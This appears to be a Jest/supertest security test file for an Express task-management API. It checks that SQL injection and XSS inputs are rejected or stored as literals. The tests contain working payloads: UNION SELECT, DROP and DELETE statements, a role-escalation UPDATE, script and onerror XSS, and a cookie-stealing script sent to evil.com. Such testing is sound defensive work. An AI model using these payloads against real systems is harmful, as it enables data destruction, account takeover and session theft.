import request from 'supertest';

// Mock express-rate-limit to bypass rate limiting in tests
jest.mock('express-rate-limit', () => {
  return () => (_req: unknown, _res: unknown, next: () => void) => next();
});

// Mock the database module
jest.mock('../../config/database', () => {
  const mockPool = {
    query: jest.fn(),
    connect: jest.fn(),
  };
  return { __esModule: true, default: mockPool };
});

// Mock models
jest.mock('../../models/user.model');
jest.mock('../../models/organization.model');
jest.mock('../../models/project.model');
jest.mock('../../models/task.model');
jest.mock('../../models/comment.model');
jest.mock('../../models/passwordResetToken.model');
jest.mock('../../services/audit.service');
jest.mock('../../services/stats.service');

import app from '../../app';
import pool from '../../config/database';
import * as userModel from '../../models/user.model';
import * as orgModel from '../../models/organization.model';
import * as projectModel from '../../models/project.model';
import * as taskModel from '../../models/task.model';
import * as commentModel from '../../models/comment.model';
import { hashPassword } from '../../utils/password';

const mockPool = pool as jest.Mocked<typeof pool>;

describe('SQL Injection Prevention', () => {
  const agent = request.agent(app);

  const orgId = 'org-sec-1';
  const userId = 'user-sec-1';
  const projectId = 'proj-sec-1';
  const taskId = 'task-sec-1';

  beforeEach(() => {
    jest.clearAllMocks();
    // Re-mock findUserById for authenticate middleware (called on every request)
    (userModel.findUserById as jest.Mock).mockResolvedValue({
      id: userId,
      organization_id: orgId,
      email: 'sectest@test.com',
      first_name: 'Sec',
      last_name: 'Test',
      role: 'org_admin',
      is_active: true,
      failed_login_attempts: 0,
      locked_until: null,
      last_login_at: null,
      created_at: new Date(),
      updated_at: new Date(),
    });
  });

  // ──────────────────────────────────────────────────────────────
  // Helper: set up authenticated session by mocking the authenticate
  // middleware response for the agent. In our mock setup, the existing
  // test files mock authenticate directly. Here we register + login
  // to set the auth cookie on the agent.
  // ──────────────────────────────────────────────────────────────
  describe('Unauthenticated injection attempts', () => {
    // ────────────────────────────────────────────────────────────
    // 1. SQL injection in login email field
    // ────────────────────────────────────────────────────────────
    it('should reject SQL injection in login email field', async () => {
      (userModel.findUserByEmail as jest.Mock).mockResolvedValue(null);

      const res = await agent
        .post('/api/v1/auth/login')
        .send({
          email: "admin@test.com' OR '1'='1",
          password: 'Password123!',
        });

      // Should fail validation (invalid email format) or return 401
      expect([400, 401]).toContain(res.status);
      expect(res.body.success).toBe(false);

      // Must not leak any user data
      expect(res.body.data).toBeNull();
    });

    it('should reject SQL injection with comment syntax in email', async () => {
      (userModel.findUserByEmail as jest.Mock).mockResolvedValue(null);

      const res = await agent
        .post('/api/v1/auth/login')
        .send({
          email: "admin@test.com'; --",
          password: 'anything',
        });

      expect([400, 401]).toContain(res.status);
      expect(res.body.success).toBe(false);
    });

    it('should reject SQL injection with UNION in email', async () => {
      (userModel.findUserByEmail as jest.Mock).mockResolvedValue(null);

      const res = await agent
        .post('/api/v1/auth/login')
        .send({
          email: "' UNION SELECT * FROM users --",
          password: 'anything',
        });

      expect([400, 401]).toContain(res.status);
      expect(res.body.success).toBe(false);
    });

    it('should reject SQL injection in registration subdomain', async () => {
      (orgModel.findOrganizationBySubdomain as jest.Mock).mockResolvedValue(null);
      (userModel.findUserByEmail as jest.Mock).mockResolvedValue(null);

      const res = await agent
        .post('/api/v1/auth/register')
        .send({
          organizationName: 'Test',
          subdomain: "'; DROP TABLE organizations; --",
          firstName: 'Test',
          lastName: 'User',
          email: 'test@test.com',
          password: 'Password123!',
        });

      // Should fail validation (subdomain format) or be handled safely
      expect([400, 409, 201]).toContain(res.status);
      // If it somehow succeeded, data should not contain leaked info
      if (res.body.data) {
        expect(JSON.stringify(res.body.data)).not.toContain('DROP TABLE');
      }
    });
  });

  describe('Authenticated injection attempts', () => {
    // Set up authentication before these tests by registering + logging in
    beforeAll(async () => {
      const hash = await hashPassword('Password123!');

      (userModel.findUserByEmail as jest.Mock).mockResolvedValue({
        id: userId,
        organization_id: orgId,
        email: 'sectest@test.com',
        password_hash: hash,
        first_name: 'Sec',
        last_name: 'Test',
        role: 'org_admin',
        is_active: true,
        failed_login_attempts: 0,
        locked_until: null,
        last_login_at: null,
        created_at: new Date(),
        updated_at: new Date(),
      });
      (userModel.resetFailedLogins as jest.Mock).mockResolvedValue(undefined);
      (userModel.updateLastLogin as jest.Mock).mockResolvedValue(undefined);
      (userModel.isAccountLocked as jest.Mock).mockResolvedValue(false);

      await agent
        .post('/api/v1/auth/login')
        .send({ email: 'sectest@test.com', password: 'Password123!' });
    });

    // ────────────────────────────────────────────────────────────
    // 2. SQL injection in project name
    // ────────────────────────────────────────────────────────────
    it('should safely handle SQL injection in project name', async () => {
      const maliciousName = "'; DROP TABLE projects; --";

      (projectModel.createProject as jest.Mock).mockResolvedValue({
        id: projectId,
        organization_id: orgId,
        name: maliciousName,
        status: 'active',
        created_by: userId,
        created_at: new Date(),
        updated_at: new Date(),
      });

      const res = await agent
        .post('/api/v1/projects')
        .send({ name: maliciousName });

      // The request should either succeed (storing the literal string)
      // or be rejected by validation -- it must NOT execute the SQL
      if (res.status === 201) {
        // If it succeeded, the name is stored as a literal string
        expect(res.body.data.project.name).toBe(maliciousName);
      } else {
        expect(res.status).toBe(400);
      }

      // If createProject was called, verify the name was passed as-is
      // (parameterized query protection)
      if ((projectModel.createProject as jest.Mock).mock.calls.length > 0) {
        const callArgs = (projectModel.createProject as jest.Mock).mock.calls[0][0];
        expect(callArgs.name).toBe(maliciousName);
      }
    });

    it('should safely handle SQL injection with subquery in project description', async () => {
      const maliciousDescription = "test'); INSERT INTO users (email, password_hash) VALUES ('hacker@evil.com', 'x'); --";

      (projectModel.createProject as jest.Mock).mockResolvedValue({
        id: 'proj-sec-2',
        organization_id: orgId,
        name: 'Normal Project',
        description: maliciousDescription,
        status: 'active',
        created_by: userId,
        created_at: new Date(),
        updated_at: new Date(),
      });

      const res = await agent
        .post('/api/v1/projects')
        .send({ name: 'Normal Project', description: maliciousDescription });

      // Should succeed by treating the injection as a literal string
      // or be rejected by validation
      expect([201, 400]).toContain(res.status);
    });

    // ────────────────────────────────────────────────────────────
    // 3. SQL injection in task search/filter parameters
    // ────────────────────────────────────────────────────────────
    it('should safely handle SQL injection in task search parameter', async () => {
      (projectModel.findProjectById as jest.Mock).mockResolvedValue({
        id: projectId,
        organization_id: orgId,
        name: 'Test Project',
      });
      (taskModel.findTasksByProject as jest.Mock).mockResolvedValue({
        tasks: [],
        total: 0,
      });

      const res = await agent
        .get(`/api/v1/projects/${projectId}/tasks?search=' UNION SELECT * FROM users --`);

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      // Verify no user data was leaked
      expect(res.body.data.tasks).toHaveLength(0);

      // Verify the search parameter was passed as a literal string to the model
      if ((taskModel.findTasksByProject as jest.Mock).mock.calls.length > 0) {
        const filters = (taskModel.findTasksByProject as jest.Mock).mock.calls[0][2];
        expect(filters.search).toBe("' UNION SELECT * FROM users --");
      }
    });

    // ────────────────────────────────────────────────────────────
    // 4. SQL injection in query params (status filter)
    // ────────────────────────────────────────────────────────────
    it('should safely handle SQL injection in status query param', async () => {
      (projectModel.findProjectById as jest.Mock).mockResolvedValue({
        id: projectId,
        organization_id: orgId,
        name: 'Test Project',
      });
      (taskModel.findTasksByProject as jest.Mock).mockResolvedValue({
        tasks: [],
        total: 0,
      });

      const res = await agent
        .get(`/api/v1/projects/${projectId}/tasks?status=' OR 1=1 --`);

      // Should return 200 with empty results (filter treated as literal)
      // or 400 if the status enum validation catches it
      expect([200, 400]).toContain(res.status);
      expect(res.body.success).toBeDefined();

      // If the model was called, the malicious string was passed as a literal
      if (res.status === 200) {
        expect(res.body.data.tasks).toHaveLength(0);
      }
    });

    it('should safely handle SQL injection in trade query param', async () => {
      (projectModel.findProjectById as jest.Mock).mockResolvedValue({
        id: projectId,
        organization_id: orgId,
        name: 'Test Project',
      });
      (taskModel.findTasksByProject as jest.Mock).mockResolvedValue({
        tasks: [],
        total: 0,
      });

      const res = await agent
        .get(`/api/v1/projects/${projectId}/tasks?trade='; DELETE FROM tasks; --`);

      expect([200, 400]).toContain(res.status);
      if (res.status === 200) {
        expect(res.body.data.tasks).toHaveLength(0);
      }
    });

    it('should safely handle SQL injection in priority query param', async () => {
      (projectModel.findProjectById as jest.Mock).mockResolvedValue({
        id: projectId,
        organization_id: orgId,
        name: 'Test Project',
      });
      (taskModel.findTasksByProject as jest.Mock).mockResolvedValue({
        tasks: [],
        total: 0,
      });

      const res = await agent
        .get(`/api/v1/projects/${projectId}/tasks?priority=' OR '1'='1`);

      expect([200, 400]).toContain(res.status);
    });

    // ────────────────────────────────────────────────────────────
    // 5. Verify no data leakage from injection attempts
    // ────────────────────────────────────────────────────────────
    it('should not leak database schema info through error messages', async () => {
      const res = await agent
        .post('/api/v1/auth/login')
        .send({
          email: "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
          password: 'x',
        });

      expect([400, 401]).toContain(res.status);

      // Error message should not contain table names, column names, or SQL syntax
      const responseBody = JSON.stringify(res.body);
      expect(responseBody).not.toContain('information_schema');
      expect(responseBody).not.toContain('table_name');
      expect(responseBody).not.toContain('pg_catalog');
    });

    it('should not leak data via SQL injection in task title', async () => {
      const maliciousTitle = "'; SELECT password_hash FROM users WHERE email='admin@test.com'; --";

      (projectModel.findProjectById as jest.Mock).mockResolvedValue({
        id: projectId,
        organization_id: orgId,
        name: 'Test Project',
      });
      (taskModel.createTask as jest.Mock).mockResolvedValue({
        id: 'task-sec-2',
        project_id: projectId,
        title: maliciousTitle,
        status: 'open',
        priority: 'normal',
        created_by: userId,
        created_at: new Date(),
        updated_at: new Date(),
      });

      const res = await agent
        .post(`/api/v1/projects/${projectId}/tasks`)
        .send({ title: maliciousTitle });

      expect([201, 400]).toContain(res.status);

      // The injection attempt is stored as a literal string — verify no actual
      // password hash values appear (the string "password_hash" in the title
      // is the injection text itself, not leaked data)
      if (res.status === 201) {
        expect(res.headers['content-type']).toContain('application/json');
        // Verify the response only contains the title we sent, not real hash data
        expect(res.body.data.task.title).toBe(maliciousTitle);
      }
    });

    it('should not leak data via SQL injection in comment text', async () => {
      const maliciousComment = "'); SELECT * FROM users; --";

      (taskModel.findTaskById as jest.Mock).mockResolvedValue({
        id: taskId,
        project_id: projectId,
        status: 'open',
      });
      (commentModel.createComment as jest.Mock).mockResolvedValue({
        id: 'comment-sec-1',
        task_id: taskId,
        user_id: userId,
        external_email: null,
        comment_text: maliciousComment,
        created_at: new Date(),
      });

      const res = await agent
        .post(`/api/v1/projects/${projectId}/tasks/${taskId}/comments`)
        .send({ commentText: maliciousComment });

      expect([201, 400]).toContain(res.status);

      // Must not contain leaked user data
      const responseBody = JSON.stringify(res.body);
      expect(responseBody).not.toContain('password_hash');
    });

    // ────────────────────────────────────────────────────────────
    // 6. XSS prevention in task title
    // ────────────────────────────────────────────────────────────
    it('should handle XSS attempt in task title without executing script', async () => {
      const xssTitle = '<script>alert("xss")</script>';

      (projectModel.findProjectById as jest.Mock).mockResolvedValue({
        id: projectId,
        organization_id: orgId,
        name: 'Test Project',
      });
      (taskModel.createTask as jest.Mock).mockResolvedValue({
        id: 'task-xss-1',
        project_id: projectId,
        title: xssTitle,
        status: 'open',
        priority: 'normal',
        created_by: userId,
        created_at: new Date(),
        updated_at: new Date(),
      });

      const res = await agent
        .post(`/api/v1/projects/${projectId}/tasks`)
        .send({ title: xssTitle });

      expect([201, 400]).toContain(res.status);

      // If the API accepts it, verify Content-Type is application/json
      // (XSS in JSON responses requires the browser to interpret it as HTML)
      if (res.status === 201) {
        expect(res.headers['content-type']).toContain('application/json');
      }
    });

    // ────────────────────────────────────────────────────────────
    // 7. Verify responses don't contain unescaped script tags
    // ────────────────────────────────────────────────────────────
    it('should not return unescaped script tags in error responses', async () => {
      const xssPayload = '<script>document.location="http://evil.com/?c="+document.cookie</script>';

      // Try XSS in various input fields and check responses

      // In project name
      (projectModel.createProject as jest.Mock).mockResolvedValue({
        id: 'proj-xss',
        organization_id: orgId,
        name: xssPayload,
        status: 'active',
        created_by: userId,
        created_at: new Date(),
        updated_at: new Date(),
      });

      const projectRes = await agent
        .post('/api/v1/projects')
        .send({ name: xssPayload });

      // Response content type must be JSON
      expect(projectRes.headers['content-type']).toContain('application/json');

      // The raw response text should be properly JSON-encoded
      // (script tags in JSON are escaped with backslashes or angle bracket encoding)
      if (projectRes.status === 201 && projectRes.body.data?.project?.name) {
        // The value is in the JSON body -- as long as content-type is JSON,
        // browsers will not execute embedded scripts
        expect(projectRes.headers['content-type']).toContain('application/json');
      }
    });

    it('should not return unescaped script tags in comment responses', async () => {
      const xssPayload = '<img src=x onerror=alert("xss")>';

      (taskModel.findTaskById as jest.Mock).mockResolvedValue({
        id: taskId,
        project_id: projectId,
        status: 'open',
      });
      (commentModel.createComment as jest.Mock).mockResolvedValue({
        id: 'comment-xss-1',
        task_id: taskId,
        user_id: userId,
        external_email: null,
        comment_text: xssPayload,
        created_at: new Date(),
      });

      const res = await agent
        .post(`/api/v1/projects/${projectId}/tasks/${taskId}/comments`)
        .send({ commentText: xssPayload });

      expect([201, 400]).toContain(res.status);
      expect(res.headers['content-type']).toContain('application/json');
    });

    it('should handle XSS in query parameters gracefully', async () => {
      (projectModel.findProjectById as jest.Mock).mockResolvedValue({
        id: projectId,
        organization_id: orgId,
        name: 'Test Project',
      });
      (taskModel.findTasksByProject as jest.Mock).mockResolvedValue({
        tasks: [],
        total: 0,
      });

      const res = await agent
        .get(`/api/v1/projects/${projectId}/tasks?search=<script>alert(1)</script>`);

      expect([200, 400]).toContain(res.status);
      expect(res.headers['content-type']).toContain('application/json');

      // If it returned 200, the search found nothing (treated as literal string)
      if (res.status === 200) {
        expect(res.body.data.tasks).toHaveLength(0);
      }
    });

    // ────────────────────────────────────────────────────────────
    // Additional SQL injection vectors
    // ────────────────────────────────────────────────────────────
    it('should handle SQL injection in project ID path parameter', async () => {
      (projectModel.findProjectById as jest.Mock).mockResolvedValue(null);

      const res = await agent
        .get("/api/v1/projects/' OR '1'='1");

      // Should return 404 because no project matches the literal string
      expect([400, 404]).toContain(res.status);
    });

    it('should handle SQL injection in task ID path parameter', async () => {
      (projectModel.findProjectById as jest.Mock).mockResolvedValue({
        id: projectId,
        organization_id: orgId,
        name: 'Test Project',
      });
      (taskModel.findTaskById as jest.Mock).mockResolvedValue(null);

      const res = await agent
        .get(`/api/v1/projects/${projectId}/tasks/1' OR '1'='1`);

      expect([400, 404]).toContain(res.status);
    });

    it('should handle batch injection attempts in task update', async () => {
      (projectModel.findProjectById as jest.Mock).mockResolvedValue({
        id: projectId,
        organization_id: orgId,
        name: 'Test Project',
      });
      (taskModel.findTaskById as jest.Mock).mockResolvedValue({
        id: taskId,
        project_id: projectId,
        status: 'open',
        created_by: userId,
      });
      (taskModel.updateTask as jest.Mock).mockResolvedValue({
        id: taskId,
        project_id: projectId,
        title: "Normal title'; UPDATE users SET role='super_admin' WHERE email='attacker@test.com'; --",
        status: 'open',
        updated_at: new Date(),
      });

      const res = await agent
        .patch(`/api/v1/projects/${projectId}/tasks/${taskId}`)
        .send({
          title: "Normal title'; UPDATE users SET role='super_admin' WHERE email='attacker@test.com'; --",
        });

      // Should either succeed (storing the literal) or be rejected
      expect([200, 400]).toContain(res.status);

      // Verify the malicious SQL was NOT treated as a command
      if ((taskModel.updateTask as jest.Mock).mock.calls.length > 0) {
        const updates = (taskModel.updateTask as jest.Mock).mock.calls[0][1];
        // The title should be passed as-is to the parameterized query
        expect(updates.title).toContain("UPDATE users SET role=");
      }
    });

    it('should handle SQL injection via pagination parameters', async () => {
      (projectModel.findProjectsByOrganization as jest.Mock).mockResolvedValue({
        projects: [],
        total: 0,
      });

      const res = await agent
        .get("/api/v1/projects?page=1; DROP TABLE projects; --&limit=10");

      // Should either parse page as 1 (parseInt ignores trailing chars)
      // or return a validation error
      expect([200, 400]).toContain(res.status);
      expect(res.body.success).toBeDefined();
    });
  });
});
